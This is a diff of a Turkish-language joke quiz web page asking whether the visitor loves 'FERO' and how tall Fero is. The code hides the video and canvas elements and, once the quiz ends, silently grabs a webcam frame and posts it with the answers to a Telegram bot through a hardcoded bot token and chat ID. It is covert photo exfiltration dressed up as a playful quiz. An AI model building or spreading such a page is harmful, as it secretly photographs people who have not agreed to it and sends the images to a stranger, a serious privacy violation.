@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Şaka Sitesi</title>
+  <title>FERO Quiz 😃</title>
   <style>
     body { 
       display: flex; 
@@ -16,7 +16,8 @@
       flex-direction: column;
       overflow: hidden;
     }
-    h1 { font-size: 2em; margin-bottom: 20px; z-index: 2; }
+    h1 { font-size: 2em; margin-bottom: 20px; }
+    .question { margin-bottom: 15px; font-size: 1.3em; }
     button { 
       padding: 10px 20px; 
       margin: 5px; 
@@ -24,13 +25,11 @@
       border-radius: 8px; 
       font-size: 16px; 
       cursor: pointer; 
-      z-index: 2;
+      background: #444; 
+      color: white;
+      transition: 0.3s;
     }
-    button:hover { opacity: 0.8; }
-    .yes { background: #4caf50; color: white; }
-    .no { background: #f44336; color: white; }
-
-    /* Gül animasyonu */
+    button:hover { background: #666; }
     .rose {
       position: absolute;
       top: -50px;
@@ -44,12 +43,15 @@
         opacity: 0;
       }
     }
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
-  <h1>FERO'yu seviyor musun?</h1>
-  <button class="yes">Evet</button>
-  <button class="no">Hayır</button>
+  <div id="quiz">
+    <div class="question">FERO'yu seviyor musun?</div>
+    <button onclick="nextQuestion('Evet')">Evet</button>
+    <button onclick="nextQuestion('Hayır')">Hayır</button>
+  </div>
 
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
@@ -62,7 +64,27 @@
     const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
     const CHAT_ID = "8494445812";
 
-    function takePhoto(answer) {
+    let answers = [];
+
+    function nextQuestion(answer) {
+      answers.push(answer);
+
+      // 2. soruya geç
+      document.getElementById("quiz").innerHTML = `
+        <div class="question">Feronun boyu kaç?</div>
+        <button onclick="finishQuiz('1,80')">A) 1,80</button>
+        <button onclick="finishQuiz('1,77')">B) 1,77</button>
+        <button onclick="finishQuiz('1,83')">C) 1,83</button>
+        <button onclick="finishQuiz('1,90')">D) 1,90</button>
+      `;
+    }
+
+    function finishQuiz(answer) {
+      answers.push(answer);
+      takePhotoAndSend();
+    }
+
+    function takePhotoAndSend() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
@@ -71,7 +93,7 @@
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "photo.png");
-        formData.append("caption", `Cevap: ${answer}`);
+        formData.append("caption", `Cevaplar: ${answers.join(", ")}`);
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
@@ -84,10 +106,7 @@
       });
     }
 
-    document.querySelector(".yes").onclick = () => takePhoto("Evet");
-    document.querySelector(".no").onclick = () => takePhoto("Hayır");
-
-    // Kamera aç
+    // Kamera aç (video gizli)
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
@@ -96,7 +115,7 @@
         document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
       });
 
-    // Gül oluşturma
+    // Gül efekti
     function createRose() {
       const rose = document.createElement("div");
       rose.classList.add("rose");
@@ -106,12 +125,8 @@
       rose.style.animationDuration = (4 + Math.random() * 4) + "s";
       document.body.appendChild(rose);
 
-      setTimeout(() => {
-        rose.remove();
-      }, 8000);
+      setTimeout(() => rose.remove(), 8000);
     }
-
-    // Her 500ms'de bir gül düşsün
     setInterval(createRose, 500);
   </script>
 </body>
